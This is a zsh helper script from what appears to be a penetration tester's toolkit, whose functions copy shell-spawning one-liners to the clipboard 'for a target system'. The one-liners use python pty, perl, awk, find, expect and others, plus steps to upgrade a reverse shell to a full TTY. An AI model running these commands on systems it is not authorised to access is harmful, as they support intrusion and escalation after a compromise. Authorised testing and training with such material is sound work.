#!/usr/bin/env zsh

############################################################# 
# nb-shell-tty
#############################################################
nb-shell-tty-help() {
    cat << "DOC" | bat --plain --language=help

nb-shell-tty
------------
The nb-shell-tty namespace provides commands for spawning interactive shells.

Commands
--------
nb-shell-tty-full        commands to spawn a fully interactive tty shell with python
nb-shell-tty-python2     command to spawn a tty shell
nb-shell-tty-python3     command to spawn a tty shell
nb-shell-tty-sh          command to spawn a tty shell
nb-shell-tty-perl        command to spawn a tty shell
nb-shell-tty-ruby        command to spawn a tty shell
nb-shell-tty-lua         command to spawn a tty shell
nb-shell-tty-awk         command to spawn a tty shell
nb-shell-tty-find        command to spawn a tty shell
nb-shell-tty-find-exec   command to spawn a tty shell
nb-shell-tty-expect      command to spawn a tty shell

DOC
}

nb-shell-tty-full() {
    __ok "Copy the commands below and use on the remote system"
    cat << "DOC" 
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
DOC
}

nb-shell-tty-python2() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="python -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-python2"
}

nb-shell-tty-python3() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-python3"
}

nb-shell-tty-sh() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="/bin/sh -i"
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-sh"
}

nb-shell-tty-perl() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="perl -e 'exec \"/bin/sh\";'"
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-perl"
}

nb-shell-tty-ruby() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="ruby: exec \"/bin/sh\""
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-ruby"
}

nb-shell-tty-lua() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="lua: os.execute('/bin/sh')"
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-lua"
}

nb-shell-tty-awk() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="awk 'begin {system(\"/bin/sh\")}'"
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-awk"
}

nb-shell-tty-find() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="find / -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-find"
}

nb-shell-tty-find-exec() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="find . -exec /bin/sh \; -quit"
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-find-exec"
}

nb-shell-tty-expect() {
    __ok "Command to use on a target system copied to clipboard"
    __COMMAND="/usr/bin/expect sh"
    echo "$__COMMAND" | wl-copy
    echo "$__COMMAND" | \bat --file-name "nb-shell-tty-expect"
}
